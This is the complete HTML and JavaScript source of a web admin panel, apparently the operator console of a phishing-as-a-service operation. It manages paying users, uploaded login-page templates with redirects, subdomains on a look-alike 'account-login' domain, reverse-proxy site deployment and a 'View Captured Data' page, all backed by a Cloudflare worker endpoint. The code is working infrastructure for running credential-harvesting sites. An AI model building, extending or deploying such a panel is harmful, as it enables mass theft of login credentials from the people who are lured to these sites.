<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Admin</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #0070f3; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        textarea { height: 150px; font-family: monospace; }
        button { background: #0070f3; color: #fff; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 14px; }
        button.btn-danger { background: #d32f2f; }
        button.btn-success { background: #28a745; }
        button:hover { opacity: 0.9; }

        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; overflow-x: auto; }
        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; white-space: nowrap; }
        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }

        .hidden { display: none; }
        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .nav-links { margin-bottom: 20px; text-align: right; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }

        /* Table Styles */
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }
        th { background: #fafafa; }

        /* Badges */
        .badge { padding: 4px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; text-transform: uppercase; }
        .badge-pending { background: #ffeeba; color: #856404; }
        .badge-active { background: #d4edda; color: #155724; }
        .badge-locked { background: #f8d7da; color: #721c24; }
        .badge-banned { background: #333; color: #fff; }

        /* Stats Dashboard */
        #system-health { display:flex; gap:20px; margin-bottom:30px; padding:25px; background:#fff; border-radius:8px; border: 1px solid #eee; justify-content:space-around; }
        .stat-box { text-align: center; }
        .stat-num { font-size: 2.5rem; margin: 0; font-weight: 800; }
        .stat-label { color: #666; font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px; }

        .search-bar { padding: 10px; width: 100%; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="captures.html">View Captured Data &rarr;</a>
        </div>
        <h1>ðŸš€ Cloud Admin Panel</h1>

        <!-- System Health -->
        <div id="system-health">
            <div class="stat-box">
                <h3 id="stat-pending" class="stat-num" style="color:#f5a623;">-</h3>
                <span class="stat-label">Pending Vouchers</span>
            </div>
            <div class="stat-box">
                <h3 id="stat-users" class="stat-num" style="color:#0070f3;">-</h3>
                <span class="stat-label">Total Users</span>
            </div>
            <div class="stat-box">
                <h3 id="stat-sites" class="stat-num" style="color:#28a745;">-</h3>
                <span class="stat-label">Active Sites</span>
            </div>
        </div>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('vouchers')">Pending Vouchers</div>
            <div class="tab" onclick="switchTab('users')">Manage Users</div>
            <div class="tab" onclick="switchTab('templates')">Templates</div>
            <div class="tab" onclick="switchTab('sites')">Sites</div>
            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy</div>
        </div>

        <!-- Vouchers Section -->
        <div id="vouchers-section" class="form-section">
            <h2>Pending Payments</h2>
            <button onclick="loadVouchers()" style="margin-bottom: 10px;">Refresh</button>
            <div id="voucher-list">Loading...</div>
        </div>

        <!-- Users Section -->
        <div id="users-section" class="form-section hidden">
            <h2>User Database</h2>
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <button onclick="loadUsers()">Refresh</button>
                <input type="text" id="user-search" onkeyup="filterTable('user-list', 'user-search')" placeholder="Search Users..." style="width: 300px; padding: 8px;">
            </div>
            <div id="user-list">Loading...</div>
        </div>

        <!-- Templates Section -->
        <div id="templates-section" class="form-section hidden">
            <h2>Existing Templates</h2>
            <div id="template-list">Loading...</div>

            <h3>Add New Template</h3>
            <div class="form-group">
                <label>Template Name</label>
                <input type="text" id="tpl-name" placeholder="e.g., login-page-v1">
            </div>
            <div class="form-group">
                <label>Redirect URL (Optional)</label>
                <input type="text" id="tpl-redirect" placeholder="https://example.com/success">
                <small>Leave blank to use default.</small>
            </div>
            <div class="form-group">
                <label>Preview Image URL (Optional)</label>
                <input type="text" id="tpl-preview" placeholder="https://example.com/preview.jpg">
                <small>Used for deployment thumbnail.</small>
            </div>
            <div class="form-group">
                <label>HTML Content</label>
                <input type="file" id="tpl-file" accept=".html,.txt" onchange="loadFile(this, 'tpl-content')" style="margin-bottom: 10px;">
                <textarea id="tpl-content" placeholder="<html>...</html>"></textarea>
            </div>
            <button onclick="saveTemplate()">Save Template</button>
        </div>

        <!-- Sites Section -->
        <div id="sites-section" class="form-section hidden">
            <h2>Manage Deployed Sites</h2>
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <button onclick="loadSites()">Refresh List</button>
                <input type="text" id="site-search" onkeyup="filterTable('site-list', 'site-search')" placeholder="Search Sites..." style="width: 300px; padding: 8px;">
            </div>
            <div id="site-list">Loading...</div>
        </div>

        <!-- Proxy Form -->
        <div id="proxy-section" class="form-section hidden">
            <p>Admin-only proxy deployment (bypasses templates).</p>
            <div class="form-group">
                <label>Subdomain</label>
                <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
            </div>
            <div class="form-group">
                <label>Target URL</label>
                <input type="text" id="proxy-url" placeholder="https://example.com">
            </div>
            <button onclick="saveProxy()">Create Proxy</button>
        </div>

        <div id="message"></div>
    </div>

    <script>
        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
             loadAllStats();
        });

        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));

            if (tab === 'vouchers') {
                document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
                document.getElementById('vouchers-section').classList.remove('hidden');
            } else if (tab === 'users') {
                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
                document.getElementById('users-section').classList.remove('hidden');
            } else if (tab === 'templates') {
                document.querySelector('.tabs .tab:nth-child(3)').classList.add('active');
                document.getElementById('templates-section').classList.remove('hidden');
                loadTemplates(); // Load explicitly
            } else if (tab === 'sites') {
                document.querySelector('.tabs .tab:nth-child(4)').classList.add('active');
                document.getElementById('sites-section').classList.remove('hidden');
            } else {
                document.querySelector('.tabs .tab:nth-child(5)').classList.add('active');
                document.getElementById('proxy-section').classList.remove('hidden');
            }
        }

        function loadFile(input, targetId) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById(targetId).value = e.target.result;
            };
            reader.readAsText(file);
        }

        async function loadAllStats() {
            // Load everything to populate stats
            await Promise.all([loadVouchers(), loadUsers(), loadSites()]);
        }

        function updateStat(id, val) {
            const el = document.getElementById(id);
            if(el) el.innerText = val;
        }

        // --- VOUCHERS ---
        async function loadVouchers() {
            const div = document.getElementById('voucher-list');
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/vouchers`, { credentials: 'include' });
                if (res.status === 401) { window.location.href = 'admin-login.html'; return; }
                const data = await res.json();

                div.innerHTML = '';
                if (data.success) {
                    updateStat('stat-pending', data.data.length);
                    if (data.data.length > 0) {
                        const table = document.createElement('table');
                        const thead = document.createElement('thead');
                        thead.innerHTML = '<tr><th>Time</th><th>User Code</th><th>Type</th><th>Voucher Code</th><th>Plan</th><th>Action</th></tr>';
                        table.appendChild(thead);

                        const tbody = document.createElement('tbody');
                        data.data.forEach(v => {
                            const tr = document.createElement('tr');

                            [new Date(v.submitted).toLocaleString(), v.uniqueCode, v.voucherType].forEach(text => {
                                const td = document.createElement('td');
                                td.textContent = text;
                                tr.appendChild(td);
                            });

                            const tdVoucher = document.createElement('td');
                            const codeEl = document.createElement('code');
                            codeEl.textContent = v.voucherCode;
                            tdVoucher.appendChild(codeEl);
                            tr.appendChild(tdVoucher);

                            const tdPlan = document.createElement('td');
                            tdPlan.textContent = v.plan ? v.plan.toUpperCase() : 'UNKNOWN';
                            tr.appendChild(tdPlan);

                            const tdAction = document.createElement('td');
                            const btnApprove = document.createElement('button');
                            btnApprove.className = 'btn-success';
                            btnApprove.textContent = 'Approve';
                            btnApprove.onclick = () => processVoucher(v.id, 'approve');

                            const btnDecline = document.createElement('button');
                            btnDecline.className = 'btn-danger';
                            btnDecline.textContent = 'Decline';
                            btnDecline.style.marginLeft = '5px';
                            btnDecline.onclick = () => declineVoucher(v.id);

                            tdAction.appendChild(btnApprove);
                            tdAction.appendChild(btnDecline);
                            tr.appendChild(tdAction);

                            tbody.appendChild(tr);
                        });
                        table.appendChild(tbody);
                        div.appendChild(table);
                    } else {
                        div.innerHTML = '<p>No pending vouchers.</p>';
                    }
                }
            } catch (e) { div.textContent = 'Error: ' + e.message; }
        }

        async function processVoucher(id, action, reason = null) {
            if (!confirm(`Are you sure you want to ${action} this voucher?`)) return;
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/voucher_action`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ voucherId: id, action, reason }),
                    credentials: 'include'
                });
                const data = await res.json();
                if(data.success) {
                    showMessage(`Voucher ${action}d successfully`, 'success');
                    loadVouchers();
                } else {
                    showMessage(data.error, 'error');
                }
            } catch (e) { showMessage(e.message, 'error'); }
        }

        function declineVoucher(id) {
            const reason = prompt("Enter reason for declining (e.g. Invalid Code):", "Invalid/Used Voucher");
            if (reason) {
                processVoucher(id, 'decline', reason);
            }
        }

        // --- USERS ---
        async function loadUsers() {
             const div = document.getElementById('user-list');
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/users`, { credentials: 'include' });
                const data = await res.json();

                div.innerHTML = '';
                if (data.success) {
                    updateStat('stat-users', data.data.length);
                    if (data.data.length > 0) {
                        const table = document.createElement('table');
                        const thead = document.createElement('thead');
                        thead.innerHTML = '<tr><th>Unique Code</th><th>Plan</th><th>Status</th><th>Strikes</th><th>Expiry</th></tr>';
                        table.appendChild(thead);

                        const tbody = document.createElement('tbody');
                        data.data.forEach(u => {
                            const tr = document.createElement('tr');

                            const tdCode = document.createElement('td');
                            tdCode.textContent = u.code;
                            tr.appendChild(tdCode);

                            const tdPlan = document.createElement('td');
                            tdPlan.textContent = u.plan ? u.plan.toUpperCase() : 'FREE';
                            tr.appendChild(tdPlan);

                            const tdStatus = document.createElement('td');
                            const badge = document.createElement('span');
                            badge.className = `badge badge-${u.status}`;
                            badge.textContent = u.status ? u.status.toUpperCase() : 'UNKNOWN';
                            tdStatus.appendChild(badge);
                            tr.appendChild(tdStatus);

                            const tdStrikes = document.createElement('td');
                            tdStrikes.textContent = u.strikes || 0;
                            tr.appendChild(tdStrikes);

                            const tdExpiry = document.createElement('td');
                            tdExpiry.textContent = u.expiry ? new Date(u.expiry).toLocaleDateString() : 'N/A';
                            tr.appendChild(tdExpiry);

                            tbody.appendChild(tr);
                        });
                        table.appendChild(tbody);
                        div.appendChild(table);
                    } else {
                        div.innerHTML = '<p>No users found.</p>';
                    }
                }
            } catch (e) { div.textContent = 'Error: ' + e.message; }
        }

        // --- SITES ---
        async function loadSites() {
            const list = document.getElementById('site-list');
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/sites`, { credentials: 'include' });
                const data = await res.json();
                list.innerHTML = '';

                if (data.success) {
                    updateStat('stat-sites', data.data.length);
                    if (data.data.length > 0) {
                        const table = document.createElement('table');
                        const thead = document.createElement('thead');
                        thead.innerHTML = '<tr><th>Subdomain</th><th>Action</th></tr>';
                        table.appendChild(thead);

                        const tbody = document.createElement('tbody');
                        data.data.forEach(site => {
                            const tr = document.createElement('tr');

                            const tdLink = document.createElement('td');
                            const a = document.createElement('a');
                            a.href = `https://${site}.account-login.co.za`;
                            a.target = "_blank";
                            a.textContent = site;
                            tdLink.appendChild(a);
                            tr.appendChild(tdLink);

                            const tdAction = document.createElement('td');
                            const btn = document.createElement('button');
                            btn.className = 'btn-danger';
                            btn.textContent = 'Delete';
                            btn.onclick = () => deleteSite(site);
                            tdAction.appendChild(btn);
                            tr.appendChild(tdAction);

                            tbody.appendChild(tr);
                        });
                        table.appendChild(tbody);
                        list.appendChild(table);
                    } else {
                        list.textContent = 'No sites found.';
                    }
                }
            } catch (e) {
                list.textContent = 'Error loading sites: ' + e.message;
            }
        }

        async function deleteSite(subdomain) {
            if(!confirm(`Delete site "${subdomain}"? This cannot be undone.`)) return;
            try {
                 const res = await fetch(`${WORKER_URL}/api/admin/sites?subdomain=` + subdomain, {
                     method: 'DELETE',
                     credentials: 'include'
                 });
                 loadSites();
            } catch(e) { alert(e.message); }
        }

        // --- TEMPLATES ---
        async function loadTemplates() {
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/templates`, { credentials: 'include' });
                if (res.status === 401) { window.location.href = 'admin-login.html'; return; }
                const data = await res.json();
                const list = document.getElementById('template-list');
                list.innerHTML = '';

                if (data.success && data.data.length > 0) {
                    const table = document.createElement('table');
                    const thead = document.createElement('thead');
                    thead.innerHTML = '<tr><th>Name</th><th>Preview</th><th>Redirect</th><th>Action</th></tr>';
                    table.appendChild(thead);

                    const tbody = document.createElement('tbody');
                    data.data.forEach(tpl => {
                        const tr = document.createElement('tr');

                        const tdName = document.createElement('td');
                        tdName.textContent = tpl.name;
                        tr.appendChild(tdName);

                        const tdPreview = document.createElement('td');
                        if (tpl.previewUrl) {
                            const img = document.createElement('img');
                            img.src = tpl.previewUrl;
                            img.style.height = "30px";
                            img.style.borderRadius = "4px";
                            tdPreview.appendChild(img);
                        } else {
                            tdPreview.textContent = 'None';
                        }
                        tr.appendChild(tdPreview);

                        const tdRedirect = document.createElement('td');
                        if (tpl.redirectUrl) {
                            const a = document.createElement('a');
                            a.href = tpl.redirectUrl;
                            a.target = "_blank";
                            a.textContent = "Link";
                            tdRedirect.appendChild(a);
                        } else {
                            tdRedirect.textContent = "Default";
                        }
                        tr.appendChild(tdRedirect);

                        const tdAction = document.createElement('td');
                        const btn = document.createElement('button');
                        btn.className = "btn-danger";
                        btn.textContent = "Delete";
                        btn.onclick = () => deleteTemplate(tpl.name);
                        tdAction.appendChild(btn);
                        tr.appendChild(tdAction);

                        tbody.appendChild(tr);
                    });
                    table.appendChild(tbody);
                    list.appendChild(table);
                } else {
                    list.innerHTML = '<p>No templates found.</p>';
                }
            } catch (e) { document.getElementById('template-list').innerText = 'Error loading templates.'; }
        }

        async function saveTemplate() {
            const name = document.getElementById('tpl-name').value;
            const content = document.getElementById('tpl-content').value;
            const redirectUrl = document.getElementById('tpl-redirect').value;
            const previewUrl = document.getElementById('tpl-preview').value;

            if (!name || !content) return showMessage('Missing fields', 'error');

            const btn = document.querySelector('#templates-section button');
            const originalText = btn.innerText;
            btn.innerText = 'Saving...';

            try {
                const res = await fetch(`${WORKER_URL}/api/admin/templates`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name, content, redirectUrl, previewUrl}),
                    credentials: 'include'
                });
                const data = await res.json();
                if (data.success) {
                    showMessage('Template saved!', 'success');
                    document.getElementById('tpl-name').value = '';
                    document.getElementById('tpl-content').value = '';
                    document.getElementById('tpl-redirect').value = '';
                    document.getElementById('tpl-preview').value = '';
                    loadTemplates();
                } else {
                    showMessage(data.error, 'error');
                }
            } catch (e) { showMessage(e.message, 'error'); }
            btn.innerText = originalText;
        }

        async function deleteTemplate(name) {
            if(!confirm('Delete template ' + name + '?')) return;
            try {
                 const res = await fetch(`${WORKER_URL}/api/admin/templates?name=` + name, {
                     method: 'DELETE',
                     credentials: 'include'
                 });
                 loadTemplates();
            } catch(e) { alert(e.message); }
        }

        async function saveProxy() {
            const subdomain = document.getElementById('proxy-subdomain').value;
            const content = document.getElementById('proxy-url').value;
            if (!subdomain || !content) return showMessage('Missing fields', 'error');

            try {
                const response = await fetch(`${WORKER_URL}/api/save`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ subdomain, type: 'PROXY', content }),
                    credentials: 'include'
                });
                const result = await response.json();
                if (result.success) showMessage('Proxy created!', 'success');
                else showMessage(result.error, 'error');
            } catch (err) {
                showMessage('Network Error: ' + err.message, 'error');
            }
        }

        function filterTable(tableId, inputId) {
            const term = document.getElementById(inputId).value.toLowerCase();
            const container = document.getElementById(tableId);
            const rows = container.querySelectorAll('tbody tr');

            rows.forEach(row => {
                const text = row.innerText.toLowerCase();
                row.style.display = text.includes(term) ? '' : 'none';
            });
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = type;
            el.style.display = 'block';
            setTimeout(() => { el.style.display = 'none'; }, 5000);
        }
    </script>
</body>
</html>
